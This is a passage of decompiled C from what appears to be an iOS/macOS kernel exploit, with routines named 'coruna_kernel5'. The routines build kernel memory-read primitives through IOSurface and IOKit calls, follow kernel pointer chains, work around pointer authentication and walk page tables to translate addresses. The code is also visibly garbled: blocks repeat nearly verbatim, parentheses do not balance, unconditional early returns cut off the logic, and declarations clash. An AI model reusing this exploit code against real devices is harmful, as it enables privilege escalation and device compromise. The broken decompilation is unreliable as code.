          version = 0x60;
          if (err < 0x2258) {
          version = 0x68;
          }
          size = k_kernel_rodata_word_33680 ^
          (k_kernel_rodata_word_33680 ^ k_kernel_rodata_word_33688) &
          coruna_u64_pack(((int)((uint)(0x2257 < err) << 0x1f) >> 0x1f), (int)((uint)(0x2257 < err) << 0x1f) >> 0x1f);
          *(uint32_t *)(handle + 0x298) = u;
          *(uint32_t *)(handle + 0x264) = version;
          *(unsigned long *)(handle + 0x290) = size;
          return;
          }
          }
          }
          else if (((err != 0x2258) && (err != 0x2712)) && (err != 0x225c)) {
          return;
          }
          u = 0xf8;
          if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
          u = 0x100;
          }
        }
      }
      if (err != 0x2712) {
        return;
      }
      err = coruna_pacia_12(handle,0x20);
      version = 0x45f0;
      u = 0x27b0;
    }
    if (err != 0) {
      u = version;
    }
  }
done:
  *(uint32_t *)(handle + 0x244) = u;
  handle = *(long *)(handle + 8);
  err = *(int *)(handle + 0x140);
  u = 0x30;
  if (err < 0x2258) {
    if ((1 < err - 0x1f53U) && (err != 0x1c1b)) {
      return;
    }
  }
  else if ((err != 0x2258) && (err != 0x225c)) {
    if (err != 0x2712) {
      return;
    }
    u = 0x28;
  }
  *(uint32_t *)(handle + 0x248) = u;
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (1 < err - 0x1f53U) {
      if (err != 0x1c1b) {
        return;
      }
      u = 0xf8;
      {
        *(uint32_t *)(handle + 600) = u;
        *(uint64_t *)(handle + 0x25c) = k_kernel_rodata_word_33670;
        *(uint64_t *)(handle + 0x268) = k_kernel_rodata_word_33678;
        u = 0x10;
        *(uint32_t *)(handle + 0x270) = 0x10;
        err = *(int *)(handle + 0x140);
        if (err < 0x2258) {
        u = 0x18;
        }
        version = 0x60;
        if (err < 0x2258) {
        version = 0x68;
        }
        size = k_kernel_rodata_word_33680 ^
        (k_kernel_rodata_word_33680 ^ k_kernel_rodata_word_33688) &
        coruna_u64_pack(((int)((uint)(0x2257 < err) << 0x1f) >> 0x1f), (int)((uint)(0x2257 < err) << 0x1f) >> 0x1f);
        *(uint32_t *)(handle + 0x298) = u;
        *(uint32_t *)(handle + 0x264) = version;
        *(unsigned long *)(handle + 0x290) = size;
        return;
      }
    }
  }
  else if (((err != 0x2258) && (err != 0x2712)) && (err != 0x225c)) {
    return;
  }
  u = 0xf8;
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    u = 0x100;
  }
cleanup:
  *(uint32_t *)(handle + 600) = u;
  *(uint64_t *)(handle + 0x25c) = k_kernel_rodata_word_33670;
  *(uint64_t *)(handle + 0x268) = k_kernel_rodata_word_33678;
  u = 0x10;
  *(uint32_t *)(handle + 0x270) = 0x10;
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    u = 0x18;
  }
  version = 0x60;
  if (err < 0x2258) {
    version = 0x68;
  }
  size = k_kernel_rodata_word_33680 ^
          (k_kernel_rodata_word_33680 ^ k_kernel_rodata_word_33688) &
          coruna_u64_pack(((int)((uint)(0x2257 < err) << 0x1f) >> 0x1f), (int)((uint)(0x2257 < err) << 0x1f) >> 0x1f);
  *(uint32_t *)(handle + 0x298) = u;
  *(uint32_t *)(handle + 0x264) = version;
  *(unsigned long *)(handle + 0x290) = size;
  return;
}
void coruna_kernel5_residual_217(long handle,long addr_2,long off_3,uint size)
{
  uint u;
  unsigned long size;
  int err;
  uint version;
  uint64_t port;
  unsigned long tag;
  unsigned long kind;
  uint8_t scratch[8];
  
  if (size != 0) {
    tag = 0;
    port = *(uint64_t *)(handle + 0x50);
    version = size;
    do {
      kind = (unsigned long)version;
      size = addr_2 + tag & 7;
      if (size == 0) {
        if (7 < kind) {
          kind = 8;
        }
      }
      else if (8 - size <= kind) {
        kind = 8 - size;
      }
      err = coruna_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(port,addr_2 + tag & 0xfffffffffffffff8,scratch,1);
      if (err != 0) {
        return;
      }
      _memcpy((void *)(off_3 + tag),(void *)((unsigned long)scratch | size),kind);
      version = version - (int)kind;
      u = ((int)tag - (int)size) + 8;
      tag = (unsigned long)u;
    } while (u < size);
  }
  return;
}
void coruna_kernel5_residual_218(long handle)
{
  int err;
  uint64_t u;
  long handle;
  long scratch;
  int bootargs;
  long thread_attr;
  
  thread_attr = 0;
  bootargs = 0;
  scratch = 0;
  u = *(uint64_t *)(handle + 8);
  handle = *(long *)(handle + 0x218);
  do {
    err = coruna_kernel5_residual_257(u,handle + (unsigned long)*(uint *)(handle + 0x298),&thread_attr);
    if (err == 0) {
      return;
    }
    if (thread_attr == 0) {
      return;
    }
    err = coruna_kernel5_via_kernel5_via_kernel5_via_thread_get_state(*(uint64_t *)(handle + 8),thread_attr + (unsigned long)*(uint *)(handle + 0x264),
                         &bootargs);
    if (err == 0) {
      return;
    }
    if (bootargs == 0) {
      err = coruna_kernel5_residual_257(*(uint64_t *)(handle + 8),thread_attr + (unsigned long)*(uint *)(handle + 0x298)
                           ,&scratch);
      if (err == 0) {
        return;
      }
      if (thread_attr == scratch) {
        *(long *)(handle + 0x278) = thread_attr;
        err = coruna_kernel5_residual_257(*(uint64_t *)(handle + 8),
                             thread_attr + (unsigned long)*(uint *)(handle + 0x294),&scratch);
        if ((err != 0) && (scratch != 0)) {
          if (*(int *)(*(long *)(handle + 8) + 0x140) < 0x2258) {
            *(long *)(handle + 0x280) = scratch;
          }
          else {
            coruna_kernel5_residual_257(*(long *)(handle + 8),scratch + 8,handle + 0x280);
          }
        }
        return;
      }
    }
    u = *(uint64_t *)(handle + 8);
    handle = thread_attr;
  } while( true );
}
void coruna_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(long handle,uint64_t val,uint64_t *id_2,unsigned long arg)
{
  int err;
  uint64_t u;
  long scratch;
  
  scratch = 0;
  *id_2 = 0;
  if (*(char *)(handle + 0x304) == '\0') {
    err = coruna_kernel5_via_vm_map(handle + 0x10,val,&scratch);
    if (err != 0) {
      return;
    }
    if (scratch == 0) {
      return;
    }
    *id_2 = 0;
    err = coruna_kernel5_via_ioservicegetmatchingservice_4(handle + 0xf0,scratch,0,id_2);
  }
  else {
    err = coruna_kernel5_via_thread_get_state_2(handle,val,id_2,arg);
  }
  if ((err == 0) && ((arg & 1) == 0)) {
    u = coruna_kernel5_via_pacia_12_9(*(uint64_t *)(handle + 8),*id_2);
    *id_2 = u;
  }
  return;
}
void coruna_kernel5_via_thread_get_state_2(long handle,uint64_t val,uint64_t *id_2,unsigned long arg)
{
  int err;
  uint64_t u;
  long scratch;
  
  scratch = 0;
  err = _pthread_mutex_lock((pthread_mutex_t *)(handle + 0x638));
  if (err == 0) {
    err = coruna_thread_get_state(handle,val,id_2,8,&scratch);
    _pthread_mutex_unlock((pthread_mutex_t *)(handle + 0x638));
    if (((err == 0) && (scratch == 8)) && ((arg & 1) == 0)) {
      u = coruna_kernel5_via_pacia_12_9(*(uint64_t *)(handle + 8),*id_2);
      *id_2 = u;
    }
  }
  return;
}
void coruna_dlopen_iosurface_c870(long handle,uint64_t val,uint *size)
{
  int err;
  long handle;
  long *ptr;
  long addr;
  uint64_t u;
  uint64_t size;
  uint64_t version;
  long off;
  uint64_t *ptr;
  long base;
  long ctx_val;
  uint64_t scratch;
  uint64_t bootargs;
  uint8_t thread_attr[24];
  uint host_info;
  long serial_buf;
  
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = 0xf60;
  handle = _dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface",1);
  if (handle == 0) goto fail;
  ptr = (long *)_dlsym(handle,"kIOSurfaceIsGlobal");
  if (((((ptr != (long *)0x0) && (off = *ptr, off != 0)) &&
       (ptr = (long *)_dlsym(handle,"kIOSurfaceWidth"), ptr != (long *)0x0)) &&
      ((base = *ptr, base != 0 &&
       (ptr = (long *)_dlsym(handle,"kIOSurfaceHeight"), ptr != (long *)0x0)))) &&
     ((ctx_val = *ptr, ctx_val != 0 &&
      (addr = _CFDictionaryCreateMutable
                         (0,0,k_kernel_kcftypedictionarykeycallbacks_slot,
                          k_kernel_kcftypedictionaryvaluecallbacks_slot), addr != 0)))) {
    _CFDictionarySetValue(addr,off,*(uint64_t *)k_kernel_kcfbooleanfalse_slot);
    coruna_cfdictionarysetvalue(addr,base);
    coruna_cfdictionarysetvalue(addr,ctx_val);
    off = _IOCFSerialize(addr,1);
    if (off != 0) {
      err = *(int *)(handle + 0x140);
      if (err < 0x2258) {
        if (0x1f52 < err) goto done;
        if (err < 0x1c1b) {
          ptr = (uint64_t *)0x0;
          version = 0;
          scratch = 0xdd0;
        }
        else {
          ptr = (uint64_t *)0x0;
          version = 0;
        }
      }
      else {
        scratch = 0xa68;
done:
        bootargs = 0;
        version = 1;
        ptr = &bootargs;
      }
      u = _CFDataGetBytePtr(off);
      size = _CFDataGetLength(off);
      err = _IOConnectCallMethod(val,0,ptr,version,u,size,0,0,thread_attr,&scratch);
      if ((err == 0) && (host_info >> 0x10 == 0)) {
        *size = host_info;
      }
      _CFRelease(off);
    }
    _CFRelease(addr);
  }
  _dlclose(handle);
}
void coruna_memmem(long handle,unsigned long arg,unsigned long *arg)
{
  unsigned long *ptr;
  uint *buf;
  size_t ls3;
  unsigned long u;
  uint size;
  bool err;
  size_t ls7;
  int err;
  uint version;
  int status;
  void *ptr;
  void *buf;
  long handle;
  long addr;
  unsigned long port;
  long off;
  unsigned long tag;
  size_t ls18;
  unsigned long scratch;
  long bootargs;
  long thread_attr;
  unsigned long host_info;
  unsigned long serial_buf;
  unsigned long action;
  uint32_t block_ctx;
  long stack_guard;
  
  stack_guard = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = 0;
  *arg = 0;
  {
    if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
    ___stack_chk_fail();
    }
    return;
  }
  if (*(long *)(handle + 0x280) == 0) {
    host_info = 0;
    serial_buf = 0;
    port = *(unsigned long *)(handle + 0x218);
    if ((((port != 0) && (*(unsigned long *)(&k_kernel_slot_19e8 + *(long *)(handle + 8)) <= port)) &&
        (port < *(unsigned long *)(&k_kernel_slot_19f0 + *(long *)(handle + 8)))) &&
       (err = coruna_kernel5_via_thread_get_state_2(handle,port + *(uint *)(handle + 0x298),&serial_buf,0), err == 0))
    {
      ptr = (unsigned long *)(handle + 0x280);
      do {
        if (serial_buf == 0) goto done;
        if ((serial_buf < *(unsigned long *)(&k_kernel_slot_19e8 + *(long *)(handle + 8))) ||
           (*(unsigned long *)(&k_kernel_slot_19f0 + *(long *)(handle + 8)) <= serial_buf)) break;
        action = 0;
        err = coruna_kernel5_via_thread_get_state_2(handle,serial_buf + *(uint *)(handle + 0x264),&action,1);
        if (err != 0) break;
        if ((int)action == 0) {
          err = coruna_kernel5_via_thread_get_state_2(handle,serial_buf + *(uint *)(handle + 0x298),&host_info,0);
          if (err != 0) break;
          if (serial_buf == host_info) {
            *(unsigned long *)(handle + 0x278) = serial_buf;
            err = coruna_kernel5_via_thread_get_state_2(handle,serial_buf + *(uint *)(handle + 0x294),&host_info,0);
            if ((err == 0) && (host_info != 0)) {
              if (*(int *)(*(long *)(handle + 8) + 0x140) < 0x2258) {
                *ptr = host_info;
                goto done;
              }
              err = coruna_kernel5_via_thread_get_state_2(handle,host_info + 8,ptr,0);
              if ((err == 0) && (*ptr != 0)) goto done;
            }
            break;
          }
        }
        err = coruna_kernel5_via_thread_get_state_2(handle,serial_buf + *(uint *)(handle + 0x298),&serial_buf,0);
      } while (err == 0);
    }
    {
      if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
      ___stack_chk_fail();
      }
      return;
    }
  }
done:
  if (*(long *)(handle + 0x308) == 0) {
    version = coruna_pacia_10(*(uint64_t *)(handle + 8));
    if ((version == 0) ||
       (err = coruna_kernel5_via_thread_get_state_2(handle,*(long *)(handle + 0x280) + (unsigned long)version,handle + 0x308,0),
       {
         if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
         ___stack_chk_fail();
         }
         return;
       }
    if ((*(unsigned long *)(handle + 0x308) < *(unsigned long *)(&k_kernel_slot_19e8 + *(long *)(handle + 8))) ||
       (*(unsigned long *)(&k_kernel_slot_19f0 + *(long *)(handle + 8)) <= *(unsigned long *)(handle + 0x308)))
    {
      if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
      ___stack_chk_fail();
      }
      return;
    }
  }
  port = *(unsigned long *)(handle + 0x310);
  if (port == 0) {
    version = coruna_kernel5_residual_269(*(uint64_t *)(handle + 8));
    if ((version == 0) ||
       (err = coruna_kernel5_via_thread_get_state_2(handle,*(long *)(handle + 0x308) + (unsigned long)version,handle + 0x310,0),
       {
         if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
         ___stack_chk_fail();
         }
         return;
       }
    port = *(unsigned long *)(handle + 0x310);
    if ((port < *(unsigned long *)(&k_kernel_slot_19e8 + *(long *)(handle + 8))) ||
       {
         if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
         ___stack_chk_fail();
         }
         return;
       }
  }
  if (((*(long *)(handle + 0x318) == 0) &&
      (err = coruna_kernel5_via_thread_get_state_2(handle,port,handle + 0x318,0), err != 0)) ||
     ((*(long *)(handle + 800) == 0 &&
      (err = coruna_kernel5_via_thread_get_state_2(handle,*(long *)(handle + 0x310) + 8,handle + 800,1), err != 0))))
  {
    if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
    ___stack_chk_fail();
    }
    return;
  }
  if (*(long *)(handle + 0x328) == 0) {
    block_ctx = 0xfa409120;
    action = k_kernel_rodata_word_33690;
    host_info = 0x8b0b394bb940092b;
    handle = *(long *)(handle + 8);
    if ((*(long *)(handle + 0x58) == 0) || (*(long *)(handle + 0x78) == 0)) {
      off = handle + 0x10;
      if ((*(int *)(handle + 0x140) < 0x2258) || (err = coruna_pacia_12(handle,0xa240), err == 0))
      {
        *(void (**)(handle + 0x10) = coruna_kernel5_via_thread_get_state;
        *(void (**)(handle + 0x18) = coruna_kernel5_via_kernel5_via_thread_get_state_2;
        *(long *)(handle + 0x20) = handle;
        err = coruna_pacia_12(handle,0x20);
        if (err == 0) {
          addr = (*(long *)(handle + 0x48) - *(long *)(handle + 800)) +
                   *(long *)(handle + 0x318);
        }
        else {
          serial_buf = 0;
          thread_attr = 0;
          version = coruna_kernel5_residual_268(handle);
          if ((version == 0) ||
             (err = coruna_kernel5_via_thread_get_state(handle,*(long *)(handle + 0x280) + (unsigned long)version,
                                   (long)*(int *)(handle + 0x168),&serial_buf), err != 0))
          {
            if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
            ___stack_chk_fail();
            }
            return;
          }
          serial_buf = coruna_kernel5_via_pacia_12_10(handle,serial_buf);
          addr = coruna_pacia(handle,serial_buf);
          {
            if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
            ___stack_chk_fail();
            }
            return;
          }
          thread_attr = coruna_pacia_5(handle,serial_buf);
          err = coruna_kernel5_via_thread_get_state(handle,thread_attr,(long)*(int *)(handle + 0x168),&thread_attr);
          {
            if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
            ___stack_chk_fail();
            }
            return;
          }
          thread_attr = coruna_kernel5_via_pacia_12_10(handle,thread_attr);
          addr = coruna_pacia(handle,thread_attr);
          if ((addr == 0) ||
             (err = coruna_kernel5_via_thread_get_state(handle,thread_attr + (long)*(int *)(handle + 0x168) * 3 + 0x10,
                                   (long)*(int *)(handle + 0x168),&serial_buf), err != 0))
          {
            if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
            ___stack_chk_fail();
            }
            return;
          }
          serial_buf = coruna_kernel5_via_pacia_12_10(handle,serial_buf);
          addr = coruna_pacia(handle,serial_buf);
          {
            if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
            ___stack_chk_fail();
            }
            return;
          }
          thread_attr = coruna_pacia_5(handle,serial_buf);
          err = coruna_kernel5_via_thread_get_state(handle,thread_attr,(long)*(int *)(handle + 0x168),&thread_attr);
          {
            if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
            ___stack_chk_fail();
            }
            return;
          }
          addr = coruna_kernel5_via_pacia_12_10(handle,thread_attr);
        }
        err = coruna_kernel5_via_pacia_12_3(off,1,addr);
        {
          if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
          ___stack_chk_fail();
          }
          return;
        }
        *(void (**)(handle + 0x10) = coruna_bzero_2;
        *(void (**)(handle + 0x18) = coruna_ret_stub;
        *(long *)(handle + 0x20) = handle + 0xf0;
      }
      else {
        err = coruna_kernel5_residual_220(off);
        {
          if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
          ___stack_chk_fail();
          }
          return;
        }
      }
    }
    port = *(unsigned long *)(handle + 0x68);
    if ((port == 0) || (ls18 = *(size_t *)(handle + 0x70), ls18 == 0)) {
      port = *(unsigned long *)(handle + 0x58);
      ls18 = *(size_t *)(handle + 0x78);
    }
    {
      if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
      ___stack_chk_fail();
      }
      return;
    }
    err = coruna_pacia_12(handle,0x20);
    ptr = &action;
    if (err != 0) {
      ptr = &host_info;
    }
    ls3 = 0xc;
    if (err != 0) {
      ls3 = 8;
    }
    ptr = _malloc(ls18);
    {
      if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
      ___stack_chk_fail();
      }
      return;
    }
    tag = ls18;
    if (port < ls18 + port) {
      off = 0;
      do {
        addr = port + off;
        u = tag;
        if (0x7ffff < tag) {
          u = 0x80000;
        }
        tag = tag - u;
        err = coruna_kernel5_via_thread_get_state(handle,addr,u,(void *)((long)ptr + off));
        if (err != 0) goto cleanup;
        buf = (void *)((long)ptr + off);
        ls7 = 0;
        if (off != 0) {
          buf = (void *)((long)ptr + (off - ls3));
          ls7 = ls3;
        }
        buf = _memmem(buf,u + ls7,ptr,ls3);
      } while ((buf == (void *)0x0) &&
              (off = off + 0x80000, addr + 0x80000U < ls18 + port));
      if (buf == (void *)0x0) goto cleanup;
      err = coruna_pacia_12(handle,0x20);
      off = -8;
      if (err != 0) {
        off = -0x28;
      }
      buf = (uint *)((long)buf + off);
      version = *buf;
      if ((version & 0x9f000000) == 0x90000000) {
        size = buf[1];
        if (((size & 0xbfc00000) == 0xb9400000) && (((version ^ size >> 5) & 0x1f) == 0)) {
          off = ((port - (long)ptr) + (long)buf & 0xfffffffffffff000) +
                   (long)(int)(version >> 0x11 & 0x3000 | (version >> 5) << 0xe) +
                   (((unsigned long)(size >> 10) & 0xfff) << (unsigned long)(size >> 0x1e));
          err = coruna_pacia_12(handle,0x20);
          if (err == 0) {
            *(long *)(handle + 0x328) = off;
            err = 8;
check_ok:
            status = coruna_kernel5_via_thread_get_state(handle,off,(unsigned long)(uint)(err * 3) << 3,handle + 0x330);
            if (status == 0) {
              *(int *)(handle + 0x630) = err;
              handle = *(long *)(handle + 8);
              if (*(long *)(&k_kernel_slot_1898 + handle) == 0) {
                *(uint64_t *)(&k_kernel_slot_1898 + handle) = *(uint64_t *)(handle + 0x328);
                *(int *)(&k_kernel_slot_18a0 + handle) = err;
              }
              err = true;
              {
                _bzero(ptr,ls18 - tag);
                _free(ptr);
                if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
                ___stack_chk_fail();
                }
                return;
              }
            }
          }
          else {
            err = coruna_kernel5_via_thread_get_state(handle,off + -8,8,&thread_attr);
            if ((err == 0) && (handle = coruna_pacia(handle,thread_attr), handle != 0)) {
              serial_buf = 0;
              err = coruna_kernel5_via_thread_get_state_2(handle,thread_attr,&serial_buf,1);
              if ((err == 0) &&
                 ((err = (int)serial_buf, (int)serial_buf - 1U < 0x20 &&
                  (status = coruna_kernel5_via_thread_get_state(handle,off,8,&bootargs), status == 0)))) {
                *(long *)(handle + 0x328) = bootargs;
                off = bootargs;
                {
                  status = coruna_kernel5_via_thread_get_state(handle,off,(unsigned long)(uint)(err * 3) << 3,handle + 0x330);
                  if (status == 0) {
                  *(int *)(handle + 0x630) = err;
                  handle = *(long *)(handle + 8);
                  if (*(long *)(&k_kernel_slot_1898 + handle) == 0) {
                  *(uint64_t *)(&k_kernel_slot_1898 + handle) = *(uint64_t *)(handle + 0x328);
                  *(int *)(&k_kernel_slot_18a0 + handle) = err;
                  }
                  err = true;
                  {
                  _bzero(ptr,ls18 - tag);
                  _free(ptr);
                  if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
                  ___stack_chk_fail();
                  }
                  return;
                  }
                  }
                }
              }
            }
          }
cleanup:
          err = false;
        }
        else {
          err = false;
        }
      }
      else {
        err = false;
      }
    }
    else {
      err = false;
    }
skip:
    _bzero(ptr,ls18 - tag);
    _free(ptr);
    {
      if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
      ___stack_chk_fail();
      }
      return;
    }
  }
  err = coruna_pacia_12(*(uint64_t *)(handle + 8),0x1000008);
  if (err == 0) {
    err = coruna_pacia_12(*(uint64_t *)(handle + 8),0x8000);
    port = arg >> 0x24 & 7;
    if (err != 0) {
      port = arg >> 0x1e & 0xff;
    }
  }
  else {
    port = arg >> 0x24 & 0x7ff;
  }
  err = coruna_kernel5_via_thread_get_state_2(handle,*(long *)(handle + 0x318) + port * 8,&scratch,1);
  if ((err == 0) && ((~(uint)scratch & 3) == 0)) {
    err = coruna_pacia_12(*(uint64_t *)(handle + 8),0x8000);
    port = 0xffffffffc000;
    if (err != 0) {
      port = 0xfffffffff000;
    }
    handle = coruna_kernel5_via_pacia_12_2(handle,port & scratch);
    if (handle != 0) {
      err = coruna_pacia_12(*(uint64_t *)(handle + 8),0x8000);
      port = arg >> 0x19 & 0x7ff;
      if (err != 0) {
        port = arg >> 0x15 & 0x1ff;
      }
      err = coruna_kernel5_via_thread_get_state_2(handle,handle + port * 8,&scratch,1);
      if ((err == 0) && ((~(uint)scratch & 3) == 0)) {
        err = coruna_pacia_12(*(uint64_t *)(handle + 8),0x8000);
        port = 0xffffffffc000;
        if (err != 0) {
          port = 0xfffffffff000;
        }
        handle = coruna_kernel5_via_pacia_12_2(handle,port & scratch);
        if (handle != 0) {
          err = coruna_pacia_12(*(uint64_t *)(handle + 8),0x8000);
          port = arg >> 0xe & 0x7ff;
          if (err != 0) {
            port = arg >> 0xc & 0x1ff;
          }
          err = coruna_kernel5_via_thread_get_state_2(handle,handle + port * 8,&scratch,1);
          if (err == 0) {
            err = coruna_pacia_12(*(uint64_t *)(handle + 8),0x8000);
            if (err == 0) {
              port = (*(unsigned long *)k_kernel_vm_page_mask_slot & arg) +
                       (scratch & 0xffffffffc000);
            }
            else {
              port = scratch & 0xfffffffff000 | arg & 0xfff;
            }
            *arg = port;
          }
        }
      }
    }
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
    ___stack_chk_fail();
  }
  return;
}
void coruna_cfdictionarysetvalue(uint64_t val,uint64_t id_2)
{
  uint64_t u;
  uint32_t scratch;
  
  scratch = 0x20;
  u = _CFNumberCreate(0,9,&scratch);
  _CFDictionarySetValue(val,id_2,u);
  _CFRelease(u);
  return;
}
void coruna_kernel5_via_pacia_12_2(long handle,unsigned long arg)
{
  int err;
  unsigned long u;
  uint size;
  unsigned long version;
  long handle;
  
  if ((*(long *)(handle + 0x328) != 0) && (*(int *)(handle + 0x630) != 0)) {
    u = 0;
    size = 2;
    do {
      version = *(unsigned long *)(handle + 0x330 + (unsigned long)(size - 2) * 8);
      handle = *(long *)(handle + 0x330 + (unsigned long)size * 8);
      err = coruna_pacia_12(*(uint64_t *)(handle + 8),0x20);
      if (err != 0) {
        handle = handle << 0xe;
      }
      if ((arg >= version && arg <= handle + version) &&
          (arg < version || handle + version != arg)) {
        return;
      }
      u = u + 1;
      size = size + 3;
    } while (u < *(uint *)(handle + 0x630));
  }
  return;
}
void coruna_kernel5_via_kernel5_via_thread_get_state_2(uint64_t val,uint64_t id_2,uint32_t *size)
{
  uint64_t scratch;
  
  scratch = 0;
  coruna_kernel5_via_thread_get_state_2(val,id_2,&scratch,1);
  *size = (int)scratch;
  return;
}
void coruna_kernel5_via_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(long handle,uint64_t val,uint64_t id_2,uint64_t *size_3)
{
  int err;
  uint64_t scratch;
  
  *size_3 = 0;
  err = coruna_kernel5_via_kernel5_via_kernel5_via_kernel5_via_ioservicegetmatchingservice_4_2();
  if (err == 0) {
    coruna_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(handle,scratch + (unsigned long)*(uint *)(handle + 0x25c),size_3,0);
  }
  return;
}
void coruna_kernel5_via_kernel5_via_kernel5_via_ioservicegetmatchingservice_4_2(long handle,long addr_2,unsigned long arg,unsigned long *arg)
{
  int err;
  long handle;
  unsigned long scratch;
  unsigned long bootargs;
  unsigned long thread_attr;
  
  err = coruna_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(handle,(unsigned long)*(uint *)(handle + 600) + addr_2,&thread_attr,0);
  if (((err == 0) &&
      (handle = *(long *)(handle + 8), *(unsigned long *)(&k_kernel_slot_19e8 + handle) <= thread_attr)) &&
     (thread_attr < *(unsigned long *)(&k_kernel_slot_19f0 + handle))) {
    if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
      err = coruna_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(handle,thread_attr,&bootargs,0);
      if (err != 0) {
        return;
      }
      if (bootargs < *(unsigned long *)(&k_kernel_slot_19e8 + *(long *)(handle + 8))) {
        return;
      }
      if (*(unsigned long *)(&k_kernel_slot_19f0 + *(long *)(handle + 8)) <= bootargs) {
        return;
      }
    }
    else {
      bootargs = thread_attr;
    }
    err = coruna_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(handle,bootargs + (arg & 0xffffffff) * 8,&scratch,0);
    if (((err == 0) && (*(unsigned long *)(&k_kernel_slot_19e8 + *(long *)(handle + 8)) <= scratch)) &&
       (scratch < *(unsigned long *)(&k_kernel_slot_19f0 + *(long *)(handle + 8)))) {
      *arg = scratch;
    }
  }
  return;
}
void coruna_kernel5_via_kernel5_via_kernel5_via_kernel5_via_ioservicegetmatchingservice_4_2(long handle,uint64_t val,uint64_t id_2,unsigned long *arg)
{
  int err;
  long scratch;
  unsigned long bootargs;
  
  err = coruna_kernel5_via_kernel5_via_kernel5_via_ioservicegetmatchingservice_4_2();
  if ((((err == 0) &&
       (err = coruna_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(handle,scratch + (unsigned long)*(uint *)(handle + 0x268),&bootargs,0),
       err == 0)) && (*(unsigned long *)(&k_kernel_slot_19e8 + *(long *)(handle + 8)) <= bootargs)) &&
     (bootargs < *(unsigned long *)(&k_kernel_slot_19f0 + *(long *)(handle + 8)))) {
    *arg = bootargs;
  }
  return;
}
void coruna_pthread_mach_thread_np(long handle)
{
  uint32_t u;
  int err;
  kern_return_t lk3;
  mach_port_t target_act;
  vm_address_t *ptr;
  uint32_t scratch;
  uint32_t bootargs;
  
  if (*(unsigned long *)(handle + 0x158) < 0x27120000000000) {
    if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
      return;
    }
    scratch = 0xffffffff;
    err = coruna_open_dev_null(&scratch);
    if (err != 0) {
      return;
    }
    if (*(int *)(&k_kernel_slot_1944 + handle) != -1) {
      _close(*(int *)(&k_kernel_slot_1944 + handle));
      *(uint32_t *)(&k_kernel_slot_1944 + handle) = 0xffffffff;
    }
    *(uint64_t *)(&UNK_00001950 + handle) = 0;
    *(uint64_t *)(&k_kernel_slot_1948 + handle) = 0;
    *(uint64_t *)(&k_kernel_slot_1958 + handle) = 0;
    u = scratch;
  }
  else {
    bootargs = 0xffffffff;
    err = coruna_open_dev_null(&bootargs);
    if (err != 0) {
      return;
    }
    ptr = *(vm_address_t **)(&k_kernel_slot_1d50 + handle);
    *(uint64_t *)(&k_kernel_slot_1d50 + handle) = 0;
    u = bootargs;
    if (ptr != (vm_address_t *)0x0) {
      if ((((*ptr == 0) || (ptr[1] == 0)) ||
          (lk3 = _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,*ptr,ptr[1]),
          lk3 == 0)) && ((pthread_t)ptr[2] != (pthread_t)0x0)) {
        target_act = _pthread_mach_thread_np((pthread_t)ptr[2]);
        lk3 = _thread_resume(target_act);
        if (lk3 == 0) {
          _pthread_join((pthread_t)ptr[2],(void **)0x0);
        }
      }
      ptr[1] = 0;
      *ptr = 0;
      ptr[3] = 0;
      ptr[2] = 0;
      *(uint64_t *)(&k_kernel_slot_1d50 + handle) = 0;
      _free(ptr);
      u = bootargs;
    }
  }
  coruna_close(u);
  return;
}
void coruna_kernel5_via_kernel5_via_kernel5_via_ioservicegetmatchingservice_4_3(long handle,unsigned long arg,int flags)
{
  unsigned long u;
  int err;
  int status;
  unsigned long scratch;
  uint64_t bootargs;
  
  status = 0;
  scratch = arg;
joined_r0x0000dcd4:
  do {
    u = arg;
    if (scratch == 0) {
      while (err = coruna_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(handle,u + 8,&scratch,0), err == 0) {
        {
          status = status + 1;
          scratch = arg;
          if (status == 3) {
          return;
          }
        }
        if (scratch < *(unsigned long *)(&k_kernel_slot_19e8 + *(long *)(handle + 8))) {
          return;
        }
        if (*(unsigned long *)(&k_kernel_slot_19f0 + *(long *)(handle + 8)) <= scratch) {
          return;
        }
        bootargs = 0;
        err = coruna_kernel5_via_kernel5_via_ioservicegetmatchingservice_4(handle,scratch + *(uint *)(handle + 0x264),&bootargs,1);
        if (err != 0) break;
        u = scratch;
        {
          *(unsigned long *)(handle + 0x218) = scratch;
          return;
        }
      }
    }
    else {
      if (scratch < *(unsigned long *)(&k_kernel_slot_19e8 + *(long *)(handle + 8))) {
        return;
      }
